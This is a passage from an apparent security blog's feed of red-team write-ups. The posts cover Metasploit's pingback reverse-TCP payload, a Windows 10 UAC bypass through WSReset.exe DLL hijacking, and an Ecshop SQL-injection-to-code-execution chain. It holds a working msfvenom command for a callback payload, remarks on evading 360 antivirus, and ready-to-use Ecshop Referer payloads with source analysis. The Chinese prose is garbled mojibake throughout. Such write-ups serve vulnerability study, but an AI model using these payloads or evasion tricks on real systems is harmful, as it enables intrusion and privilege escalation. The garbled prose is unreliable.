class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackRetries'</span>, [<span class="literal">true</span>, <span class="string">"How many additional successful pingbacks"</span>, <span class="number">0</span>]),</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackSleep'</span>, [<span class="literal">true</span>, <span class="string">"Time (in seconds) to sleep between pingbacks"</span>, <span class="number">30</span>])</span><br><span class="line">      ], <span class="keyword">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><ul><li>PingbackRetries  - pingbackçš„æ¬¡æ•°</li><li>PingbackSleep - pinigbackçš„æ—¶é—´é—´éš”</li></ul><p>æˆ‘ä»¬åˆ©ç”¨ <code>Msfvenom</code> ç”Ÿæˆä¸€ä¸ª <code>windows/x64/pingback_reverse_tcp</code> çš„exeæœ¨é©¬</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/pingback_reverse_tcp -f exe -o patrilic.exe LHOST=<span class="number">192.168</span>.<span class="number">1.107</span> LPORT=<span class="number">4445</span> EXITFUNC=thread PINGBACKRETRIES=<span class="number">10</span> PINGBACKSLEEP=<span class="number">5</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œæ—¶ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698698752-8e60bbfb-8134-4cae-a909-80499d4ab5c2.png" alt="image.png"><br>åªä¼šè¿”å›UUID<br><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698945771-f65f647a-3285-42e1-863e-29555f64cca5.png" alt="image.png"></p><p>ç„¶åç›®æ ‡æœºå™¨ä¸Šå¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•çš„äº¤äº’å¼shellï¼ŒåŒæ—¶ä½¿ç”¨ <code>Wireshark</code> ä¹Ÿåªèƒ½æ•è·åˆ°16byteçš„UUIDå€¼</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567699063357-40b97628-fdfa-4c67-951a-546ce62b1f6e.png" alt="image.png"></p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>è¿™æ¬¡æ›´æ–°çš„pingback payloadï¼Œå·²ç»æ„Ÿè§‰æ˜¯æœ€å°åŒ–çš„æ”»å‡»è½½è·äº†ï¼Œè€Œä¸”ç‰¹å¾ä¹Ÿå¹¶ä¸æ˜æ˜¾ï¼Œåªæ˜¯ä¸€ä¸²éšæœºçš„UUIDå€¼è€Œå·²ï¼Œæ„Ÿè§‰ç”¨æ¥éªŒè¯æ¼æ´è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œç„¶ååé¢å†åŠæ³•å»æ‰expç‰¹å¾ï¼Œä½¿ç”¨å¦å¤–çš„æ–¹å¼æ¥è·å¾—äº¤äº’å¼shellæˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤äº‘äº‘.. å½“ç„¶ï¼Œmsfç›´æ¥ç”Ÿæˆçš„ç¨‹åºç‰¹å¾è¿˜æ˜¯æŒºæ˜æ˜¾çš„ï¼Œè¿˜æ˜¯éœ€è¦è¿›è¡Œå…æ€ï¼Œä¸è¿‡ç”±äºè¿™ä¸ªpayloadå¹¶æ²¡æœ‰è¿›è¡Œèµ·æ•æ„Ÿè¿›ç¨‹ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒå¥½å…æ€çš„ã€‚</p><p>shellcodeéšä¾¿åŠ å¯†æäº†ä¸‹ï¼Œé™æ€è¿˜è¡Œï¼Œä½†æ˜¯åŠ¨æ€ä¼°è®¡ä¹Ÿæ²¡å•¥2333æ¯•ç«Ÿä¹Ÿæ²¡æœ‰å±é™©è¿›ç¨‹ï¼Œåªæ˜¯å¼€äº†ä¸ªsocket</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701851264-0e1de3de-9aec-49dd-99cc-278ba2685e22.png#align=left&amp;display=inline&amp;height=937&amp;name=image.png&amp;originHeight=1874&amp;originWidth=3358&amp;size=497343&amp;status=done&amp;width=1679" alt="image.png"></p><p>ç„¶åè¿›ç¨‹å¼€èµ·æ¥çš„è¯ï¼Œæ‰¾äº†ä¸ª360çš„æœºå­è¯•äº†ä¸‹ï¼Œæ²¡å•¥é—®é¢˜</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701981644-609e99b8-e943-4859-96fb-00c8d6ffa46e.png" alt="image1.png"></p><p>ä¸è¿‡ç‰¹å¾ä¼°è®¡ä¹Ÿå¿«æ™®åŠäº†ï¼Œæ„Ÿè§‰æ€è·¯æŒºå¥½çš„ï¼Œå­¦ä¹ äº†ï½</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a name=&quot;JSO7R&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="metasploit" scheme="http://patrilic.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Windows10 BypassUAC with WSReset.exe</title>
    <link href="http://patrilic.top/2019/08/29/Windows10%20BypassUAC%20with%20WSReset.exe/"/>
    <id>http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/</id>
    <published>2019-08-29T15:51:00.000Z</published>
    <updated>2019-08-30T00:49:55.667Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>Time: 2019-08-29 23:51:00<br><img src="/wallpaper/63740442.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p><a href="https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html" target="_blank" rel="noopener">https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html</a></p><p>åˆ©ç”¨<code>WSReset.exe</code>è¿›è¡ŒbypassUACã€‚</p><p>ä¸ºä»€ä¹ˆåªé™äºWin10å‘¢ï¼Œå› ä¸ºè¿™ä¸ªä½äº<code>C:\WINDWOS\System32</code> ç›®å½•ä¸‹çš„ç¨‹åºï¼Œæ˜¯å¾®è½¯å•†åº—çš„ä¸€ä¸ªå·¥å…·<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/E969032A-4448-40D0-9389-395E1D9502AA.png" alt="6f262c0c97c3dfb682f04fd809cf60e3"></p><h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a>0x01 Bypass</h2><p>è¿™é‡ŒåŸä½œè€…è‡ªå·±ç¼–å†™äº†è„šæœ¬å’Œå·¥å…·ï¼š<br><a href="https://github.com/sailay1996/UAC_bypass_windows_store" target="_blank" rel="noopener">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>é¦–å…ˆä½¿ç”¨<code>UAC.bat</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/CB964BB5-BB3A-4D53-A67C-6E6454849741.png" alt="ec35f36d2e88012ed02af35cbc09e1f0"></p><p>åˆ›å»ºä¸€ä¸ªå¸¦ç©ºæ ¼å­—ç¬¦çš„ç›®å½•ï¼Œç„¶åæŠŠWSResetæ‰”è¿›å»</p><p>æ¥ç€è¿è¡Œ<code>uac_bypass.exe</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/8FF6C343-6736-4498-A988-5766929E0EFD.png" alt="c4add2018e585c2ca68544c6acabb04e"></p><p>è°ƒç”¨DLLï¼Œå¼¹å‡ºå¯¹è¯æ¡†<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/A6D6CAA5-A74F-4965-B791-F1E7FCDDC7B7.png" alt="605ad7a9df01dc55e5392b562a029677"><br>ä¸»è¦å°±æ˜¯å› ä¸ºè¿™ä¸ªğŸ‘‰<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/32B27C2A-82C9-4934-9CCD-3051DBEAC8A7.png" alt="589206bf8c6b67a17a09253985b8e353"></p><p>ç„¶åä¼šå¼¹å‡ºä¸€ä¸ªç®¡ç†å‘˜çš„CMD<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/B375540E-97FA-4751-8A24-9A0385A5341F.png" alt="4c6538e20548f14902cfd64df18f0cb6"></p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè™šæ‹Ÿæœºä¸€ç›´ä¿æŒé«˜é€Ÿä¸‹è½½<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/92007680-2629-45ED-AE96-E6C8863511D2.png" alt="f1748df2675213d7fa216762acb9be4c"></p><p>æ„Ÿè§‰ç¨‹åºé‡Œæœ‰äº›ä¸œè¥¿..åé¢æ— èŠå†åˆ†æå§ã€‚</p><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>bypassUACæ–¹æ³•å¤šç§å¤šæ ·ï¼Œçœ‹è¿™ä¸ªåªæ˜¯å› ä¸ºå¥½ç©ï¼Œç”¨å¾®è½¯æ²¡å•¥ç”¨çš„åº”ç”¨å•†åº—çš„ç»„ä»¶ï¼Œå…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯DLLåŠ«æŒ2333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;Time: 2019-08-29 23:51:00&lt;br&gt;&lt;img src=&quot;/wallpaper/63740442.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;
      
    
    </summary>
    
      <category term="BypassUac" scheme="http://patrilic.top/categories/BypassUac/"/>
    
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop 2.x/3.x SQLæ³¨å…¥ + ä»£ç æ‰§è¡Œ</title>
    <link href="http://patrilic.top/2019/08/27/Ecshop%202.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/08/27/Ecshop 2.x ä»£ç æ‰§è¡Œ/</id>
    <published>2019-08-26T16:03:02.000Z</published>
    <updated>2019-08-27T18:00:58.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-27 00:03:02<br><img src="/wallpaper/[60268880.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å¾ˆå¤šQBçš„Passer6yç»™æˆ‘å‘äº†ä¸ªé•¿å¾—å¥‡å¥‡æ€ªæ€ªçš„payloadï¼Œæƒ³äº†ä¸‹ï¼Œå¥½åƒæ˜¯Ecshop 2.xçš„RCEï¼Œæ˜¨å¹´çœ‹åˆ°å°±æƒ³åˆ†æï¼Œä¸€ç›´æå¿˜äº†.. ä»Šæ™šè¡¥ä¸Šï¼<br>PS: é€Ÿåº¦ä¸æ¿€æƒ…çœŸçš„å¥½çœ‹ï¼ŒDwayne Johnsonå¤ªå¸…ahhhh</p><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨phpstudy 2018 æ­å»º</p><blockquote><p>åˆ†æå·¥å…·ï¼š PhpStorm<br>php 5.3.29 nts + Apache<br>MySQL 5.5.3</p></blockquote><h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>æ¼æ´å‘ç”Ÿåœ¨user.php çš„ Refererå¤„<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">72</span>:<span class="string">"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/0BD49A51-AEE2-4D13-A91A-9313BB129B0C.png" alt="e21d6b60329ce5b0f5a9129ba3da49b6"></p><h3 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>å…¶å®æ˜¯SQLæ³¨å…¥çš„è¿›ä¸€æ­¥åˆ©ç”¨ï¼ŒåŒæ ·æ˜¯åœ¨user.php<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/AF83B1F8-8389-4E44-AB11-AE46841695E0.png" alt="63cf020521a24682a91cb6aae5e91fbb"></p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h2><h3 id="SQLæ³¨å…¥æ¼æ´"><a href="#SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQLæ³¨å…¥æ¼æ´"></a>SQLæ³¨å…¥æ¼æ´</h3><p>ç›´æ¥çœ‹æ¼æ´å‘ç”Ÿç‚¹ï¼š<br>æ—¢ç„¶payloadæ˜¯ä»Refererä¼ è¿›æ¥çš„ï¼Œé‚£ä¹ˆå°±ç›´æ¥çœ‹<code>[&#39;HTTP_REFERER&#39;]</code><br><strong>user.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ç”¨æˆ·ç™»å½•ç•Œé¢ */</span></span><br><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$back_act</code> ä»<code>HTTP_REFERER</code>é‚£é‡Œæ‹¿åˆ°å€¼ï¼Œç„¶å<code>$smarty-&gt;assign(&#39;back_act&#39;, $back_act);</code><br>å°†<code>$back_act</code>ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨<code>assign</code>å‡½æ•°<br><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/AE65DFBE-6628-45D3-9296-922A907441D6.png" alt="754c7a3810743fdf7d2cf06aeea33529"><br>å®é™…è°ƒç”¨çš„æ˜¯<code>/includes/cls_template.php</code>ä¸‹çš„<code>assign</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…¶å®æ˜¯æ³¨å†Œäº†æ¨¡æ¿å˜é‡ï¼Œç„¶åå›åˆ°loginå¤„ï¼Œè°ƒç”¨äº†displayå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">        $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">            <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>filenameä¾¿æ˜¯ä¼ å…¥çš„<code>user_passport.dwt</code>ï¼Œè¿™é‡Œè°ƒç”¨fetchå¤„ç†dwtæ–‡ä»¶ï¼Œè½¬åˆ°fetchå‡½æ•°ï¼Œä½¿ç”¨äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</span><br></pre></td></tr></table></figure></p><p>ç„¶åä½¿ç”¨make_compiledå‡½æ•°è¿›è¡Œç¼–è¯‘<br><code>user_passport.dwt</code>é‡Œé¢å­˜åœ¨{$back_act}å˜é‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align=<span class="string">"left"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"act"</span> value=<span class="string">"act_login"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"back_act"</span> value=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span><br><span class="line">&lt;input type="submit" name="submit" value="" class="us_Submit" /&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p><p>displayå‡½æ•°é‡Œå­˜åœ¨ä¸€ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœ<code>$out</code>æ˜¯å¦å­˜åœ¨<code>$this-&gt;_echash</code>ï¼Œè€Œè¿™ä¸ªhashå€¼ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé™æ€å˜é‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $_echash = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œä»hashå¤„åˆ†å‰²ï¼Œç„¶åæŠŠ<code>$k</code>äº¤ç»™<code>$this-&gt;insert_mod($val)</code>å»å¤„ç†<br>ç»§ç»­è·Ÿ<code>insert_mod()</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // å¤„ç†åŠ¨æ€å†…å®¹</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">        $para = unserialize($para);</span><br><span class="line">        $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $fun($para);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå…ˆç”¨<code>|</code>åˆ†å‰²ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œç„¶åå†ä½¿ç”¨<code>insert_</code>æ‹¼æ¥ï¼Œæ‰€ä»¥å…¶å®ï¼Œè¯¥å‡½æ•°åå’Œå‚æ•°å‡å¯æ§<br>å°±æ˜¯éœ€è¦å¯»æ‰¾ä¸€ä¸ª<code>insert_</code>å¼€å¤´çš„å‡½æ•°ã€‚</p><p>æœ€åï¼Œ<code>/includes/lib_insert.php</code>é‡Œå­˜åœ¨ä¸€ä¸ª<code>insert_ads</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($static_res[$arr[<span class="string">'id'</span>]] === <span class="keyword">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql  = <span 